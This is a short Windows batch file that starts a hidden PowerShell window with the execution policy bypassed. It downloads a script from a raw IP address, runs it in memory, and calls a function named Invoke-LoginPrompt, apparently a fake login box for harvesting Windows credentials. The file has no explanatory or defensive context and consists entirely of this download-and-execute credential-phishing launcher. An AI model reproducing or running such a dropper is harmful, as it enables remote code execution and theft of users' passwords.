@echo off
powershell.exe -WindowStyle Hidden -ep bypass -c "IEX ((New-Object Net.WebClient).DownloadString('http://157.230.62.106/sec.ps1')); Invoke-LoginPrompt"
